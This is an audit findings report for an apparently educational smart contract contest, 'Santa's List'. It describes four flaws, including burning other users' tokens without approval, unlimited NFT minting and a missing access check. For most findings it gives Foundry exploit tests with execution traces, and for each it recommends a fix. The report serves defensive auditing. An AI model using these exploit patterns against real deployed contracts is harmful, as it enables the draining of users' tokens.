# First Flight #5: Santa's List - Findings Report

# Table of contents

- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
  - ### [H-01. User can buy presents for themselves with other's token](#H-01)
  - ### [H-02. Verified winners can mint as many presents as they want.](#H-02)
  - ### [H-03. `SantaList.checklist` is permissionless](#H-03)
- ## Medium Risk Findings
  - ### [M-01. Naughty users buy present for lesser price](#M-01)

# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #5

### Dates: Nov 30th, 2023 - Dec 7th, 2023

[See more contest details here](https://www.codehawks.com/contests/clpba0ama0001ywpabex01hrp)

# <a id='results-summary'></a>Results Summary

### Number of findings:

- High: 3
- Medium: 1

# High Risk Findings

## <a id='H-01'></a>H-01. User can buy presents for themselves with other's token

### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L172-L175

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantaToken.sol#L28-L33

## Summary

Attacker can burn others' token to buy present for himself.

## Vulnerability Details

The function `Santalist.buyPresent` allow msg.sender to mint Present by burning a certain amount of token. This function burns the token of the `presentReceiver` without checking for approvals. An attacker can burn the token of all users to buy presents for themselves.

## Impact

The balance of all SantaToken(ERC20) can be drained.

### Tests:

```javascript
function testHackBuyPresent() public {
        address naiveUserA = makeAddr("naiveUserA");
        address naiveUserB = makeAddr("naiveUserB");
        address naiveUserC = makeAddr("naiveUserC");

        address[3] memory naiveUsers = [naiveUserA, naiveUserB, naiveUserC];

        for (uint256 i = 0; i < 3; i++) {
            deal(address(santaToken), naiveUsers[i], 1e18);
            assertEq(santaToken.balanceOf(naiveUsers[i]), 1e18);

            vm.prank(user);
            santasList.buyPresent(naiveUsers[i]);

            assertEq(santaToken.balanceOf(naiveUsers[i]), 0);
        }
        assertEq(santasList.balanceOf(user), 3);
}
```

## Tools Used

Foundry

## Recommendations

Always check for approval before performing actions on user's token.
Rewrite the function to only burn the msg.sender's token and mint to `presentReciever`

```javascript
 function buyPresent(address presentReceiver) external {
        // TransferFrom checks the allowance
        i_santaToken.transferFrom(msg.sender, address(this), 1e18);
        i_santaToken.burn(address(this));

        // Mint the NFT to the receiver
        _safeMint(presentReceiver, s_tokenCounter++);
    }
```

## <a id='H-02'></a>H-02. Verified winners can mint as many presents as they want.

### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L147-L166

## Summary

Verified winners can mint as many presents as they want.

## Vulnerability Details

`Santalist.collectPresent` prevents users from collecting NFTs more than once by checking if they already possess an NFT. This NFTs can be transferred to another EOA and the user will keep minting more.

## Impact

This increases the total supply of the NFTs and make it non-valuable.

#### Test:

```javascript
function testHackCollectPresent() public {
     vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.NICE);
        santasList.checkTwice(user, SantasList.Status.NICE);
     vm.stopPrank();

     vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);
     address user2 = makeAddr("user2");

     vm.startPrank(user);
       for (uint256 i = 0; i < 5; i++) {
          santasList.collectPresent();
          santasList.transferFrom(user, user2, i);
       }
       assertEq(santasList.balanceOf(user2), 5);
     vm.stopPrank();
    }
```

#### Traces:

```zsh
    [274512] SantasListTest::testHackCollectPresent()
    ├─ [0] VM::startPrank(santa: [0x70C9C64bFC5eD9611F397B04bc9DF67eb30e0FcF])
    │   └─ ← ()
    ├─ [4211] SantasList::checkList(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], 0)
    │   ├─ emit CheckedOnce(person: user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], status: 0)
    │   └─ ← ()
    ├─ [4519] SantasList::checkTwice(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], 0)
    │   ├─ emit CheckedTwice(person: user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], status: 0)
    │   └─ ← ()
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    ├─ [283] SantasList::CHRISTMAS_2023_BLOCK_TIME() [staticcall]
    │   └─ ← 1703480381 [1.703e9]
    ├─ [0] VM::warp(1703480382 [1.703e9])
    │   └─ ← ()
    ├─ [0] VM::addr(23868421370328131711506074113045611601786642648093516849953535378706721142721 [2.386e76]) [staticcall]
    │   └─ ← user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802]
    ├─ [0] VM::label(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], "user2")
    │   └─ ← ()
    ├─ [0] VM::startPrank(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D])
    │   └─ ← ()
    ├─ [70250] SantasList::collectPresent()
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], tokenId: 0)
    │   └─ ← ()
    ├─ [22727] SantasList::transferFrom(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], 0)
    │   ├─ emit Transfer(from: user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], to: user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], tokenId: 0)
    │   └─ ← ()

        ..........

    ├─ [46350] SantasList::collectPresent()
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], tokenId: 4)
    │   └─ ← ()
    ├─ [5207] SantasList::transferFrom(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], 4)
    │   ├─ emit Transfer(from: user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], to: user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], tokenId: 4)
    │   └─ ← ()
    ├─ [678] SantasList::balanceOf(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802]) [staticcall]
    │   └─ ← 5
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    └─ ← ()
```

## Tools Used

Manual review, Foundry.

## Recommended Mitigation

Create a mapping `hasCollected(address => bool)` to keep track of which users have collected presents.

## <a id='H-03'></a>H-03. `SantaList.checklist` is permissionless

### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L121-L124

## Summary

`SantaList.checklist` can be called by anyone.

## Vulnerability Details

The comment states that `checkList()` is only callable by santa. But there are no checks to prevent others from calling this function. This means anyone can change `s_theListCheckedOnce`.

## Impact

Prevent the second checkList `checkTwice` from passing. Also prevent user from collecting presents by changing `s_theListCheckedOnce`.

#### Test:

```javascript
   function testHackCheckList() public {
        vm.prank(user);
        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
        assertEq(uint256(santasList.getNaughtyOrNiceOnce(user)), uint256(SantasList.Status.EXTRA_NICE));
    }
```

#### Traces

```zsh
[35868] SantasListTest::testHackCheckList()
    ├─ [0] VM::prank(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D])
    │   └─ ← ()
    ├─ [24111] SantasList::checkList(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], 1)
    │   ├─ emit CheckedOnce(person: user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], status: 1)
    │   └─ ← ()
    ├─ [690] SantasList::getNaughtyOrNiceOnce(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D]) [staticcall]
    │   └─ ← 1
    └─ ← ()
```

## Tools Used

Manual review, Foundry

## Recommendations

Add `onlySanta` modifier to function.

# Medium Risk Findings

## <a id='M-01'></a>M-01. Naughty users buy present for lesser price

### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L87-L88

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantaToken.sol#L28-L33

## Summary

When naughty users buy present, they buy it for `rather than`PURCHASED_PRESENT_COST` (2e18).

## Vulnerability Details

When naughty interact with `SantaList.buyPresent`, they are supposed to pay `PURCHASED_PRESENT_COST`. This amount is burnt with `i_santaToken.burn`. the burn function does not make use of this constant when calling `_burn`, It uses a defined cost in the function.

## Impact

Users mint for half the price.

## Tools Used

Manual Review.

## Recommendations

Function burn should take in an amount to burn as parameter. `buyPresent` can call this with `PURCHASED_PRESENT_COST`.

- `SantaToken.sol`

```javascript
    function burn(address from, uint amount) external {
        if (msg.sender != i_santasList) {
            revert SantaToken__NotSantasList();
        }
        _burn(from, amount);
    }
```

- `SantasList.sol`

```javascript
     function buyPresent(address presentReceiver) external {
        i_santaToken.burn(presentReceiver, PURCHASED_PRESENT_COST);
        _mintAndIncrement();
     }
```
